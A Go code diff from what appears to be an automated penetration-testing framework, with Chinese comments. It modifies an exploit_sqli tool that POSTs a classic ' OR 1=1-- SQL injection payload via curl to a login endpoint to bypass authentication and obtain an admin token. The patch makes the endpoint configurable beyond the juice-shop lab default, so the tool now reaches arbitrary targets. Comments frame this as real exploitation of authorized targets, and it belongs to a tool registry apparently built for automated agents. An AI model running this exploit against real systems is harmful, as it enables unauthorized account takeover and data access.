@@ -137,10 +137,17 @@ func containsTag(tags []string, want string) bool {
 
 // exploitSQLiLogin —— L3 真实利用: 对登录接口发 SQLi payload(经典 ' OR 1=1--), 尝试认证绕过。
 // 对授权靶(juice-shop 等)有效, 成功则响应携带 authentication token。
+// D23 修复: 端点不再硬编码 /rest/user/login —— 支持 endpoint 参数覆盖(如 /login),
+// 未提供时默认 /rest/user/login(juice-shop), 其他目标由调用方显式指定。
 // exploitSQLiLogin —— SQLi 登录绕过利用。curl(-4 强制 IPv4)+ 临时文件传 payload:
 // 一次绕开三个坑 —— Windows 命令行引号转义、localhost→IPv6 挂起、Go net/http 对该靶的请求挂起。
 func exploitSQLiLogin(args map[string]any) tools.ToolResult {
 	target := baseURL(tools.ArgStr(args, "target", ""))
+	// D23: 端点可配置, 默认 juice-shop 路径; 空 target 由 baseURL 返回空, 提前拒绝。
+	endpoint := tools.ArgStr(args, "endpoint", "/rest/user/login")
+	if target == "" {
+		return tools.ToolResult{Success: false, Stderr: "exploit_sqli: target 参数为空", RC: -1}
+	}
 	f, err := os.CreateTemp("", "vero-sqli-*.json")
 	if err != nil {
 		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
@@ -150,7 +157,7 @@ func exploitSQLiLogin(args map[string]any) tools.ToolResult {
 	_ = f.Close()
 	res := tools.Sh([]string{"curl", "-s", "-4", "--max-time", "20",
 		"--retry", "3", "--retry-delay", "2", "--retry-all-errors", // 前置工具(nuclei)过载靶场后自动重试
-		"-X", "POST", target + "/rest/user/login", "-H", "Content-Type: application/json",
+		"-X", "POST", target + endpoint, "-H", "Content-Type: application/json",
 		"--data", "@" + f.Name()}, 90*time.Second)
 	// 成功判定对齐 ParseSQLi: 响应必须携带 authentication token 才是认证绕过成功。
 	// 修: 原实现仅看进程退出码 —— 空 body/代理 502 也会被当作“利用成功”,
@@ -240,8 +247,10 @@ func WebPack() Pack {
 				Args: []tools.ArgSpec{
 					{Name: "target", Desc: "目标 URL(带 scheme)", Required: true},
 					{Name: "domain", Desc: "基础域, 如 example.com"},}},
-			{Name: "exploit_sqli", Level: tools.LevelExploit, Desc: "SQLi 登录绕过利用, 对 /rest/user/login 发注入 payload 尝试认证绕过, 成功得 admin token", Run: exploitSQLiLogin, Parse: ParseSQLi, Produces: "web_shell",
-				Args: []tools.ArgSpec{{Name: "target", Desc: "站点根 URL(带 scheme), 内部自动拼 /rest/user/login", Required: true}}},
+			{Name: "exploit_sqli", Level: tools.LevelExploit, Desc: "SQLi 登录绕过利用, 发注入 payload 尝试认证绕过, 成功得 admin token", Run: exploitSQLiLogin, Parse: ParseSQLi, Produces: "web_shell",
+				Args: []tools.ArgSpec{
+					{Name: "target", Desc: "站点根 URL(带 scheme)", Required: true},
+					{Name: "endpoint", Desc: "登录端点, 默认 /rest/user/login(juice-shop), 其他目标可指定如 /login"}}},
 		},
 		Fingerprint: func(s map[string]bool) bool {
 			return s["http"] || s["https"] || s["ssl/http"] || s["http-proxy"]
